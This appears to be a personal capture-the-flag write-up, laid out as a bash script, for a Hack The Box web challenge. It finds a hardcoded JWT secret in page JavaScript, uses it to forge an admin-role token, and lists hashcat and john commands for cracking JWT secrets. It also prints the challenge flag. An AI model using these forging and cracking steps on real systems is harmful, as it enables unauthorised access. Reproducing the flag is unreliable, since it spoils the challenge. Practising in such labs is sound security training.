#!/bin/bash
# Day 18 - HTB Challenge: OpenSecret | Commands & Explanations

# ─────────────────────────────────────────
# RECONNAISANCE — VIEW PAGE SOURCE
# ─────────────────────────────────────────

# Fetch full page source including inline JavaScript
curl -s http://154.57.164.65:32631

# Fetch page and search for secret/key/token keywords
curl -s http://154.57.164.65:32631 | grep -i "secret\|key\|token\|password"

# ─────────────────────────────────────────
# BROWSER STEPS (manual)
# ─────────────────────────────────────────

# 1. Open the challenge URL in browser
# 2. Press F12 to open DevTools
# 3. Go to Sources tab
# 4. Press Ctrl+Shift+F to search across all files
# 5. Search for: secret
# 6. Found: const SECRET_KEY = "HTB{0p3n_s3cr3ts_ar3_n0t_s3cr3ts}"

# ─────────────────────────────────────────
# JWT ANALYSIS (for learning purposes)
# ─────────────────────────────────────────

# Install PyJWT to work with JWT tokens
pip3 install pyjwt --break-system-packages

# Decode a JWT token without verification (just inspect payload)
python3 - << 'EOF'
import jwt
import base64
import json

# Paste any JWT token here to decode it
token = "YOUR_JWT_TOKEN_HERE"

# Decode without verification to see the payload
parts = token.split(".")
padding = 4 - len(parts[1]) % 4
decoded = base64.urlsafe_b64decode(parts[1] + "=" * padding)
print("[+] JWT Payload:", json.loads(decoded))
EOF

# Forge a new JWT token with a known secret
python3 - << 'EOF'
import jwt

# Secret found in JavaScript source code
secret = "HTB{0p3n_s3cr3ts_ar3_n0t_s3cr3ts}"

# Forge a token with admin role
payload = {
    "username": "admin",
    "role": "admin"
}

token = jwt.encode(payload, secret, algorithm="HS256")
print(f"[+] Forged admin token: {token}")
EOF

# ─────────────────────────────────────────
# USEFUL JWT TOOLS
# ─────────────────────────────────────────

# Online JWT decoder and forger:
# https://jwt.io

# Crack unknown JWT secrets with hashcat
# -m 16500 → JWT (HS256) mode
hashcat -m 16500 jwt.hash ~/rockyou.txt

# Crack JWT secrets with john
john --wordlist=~/rockyou.txt jwt.hash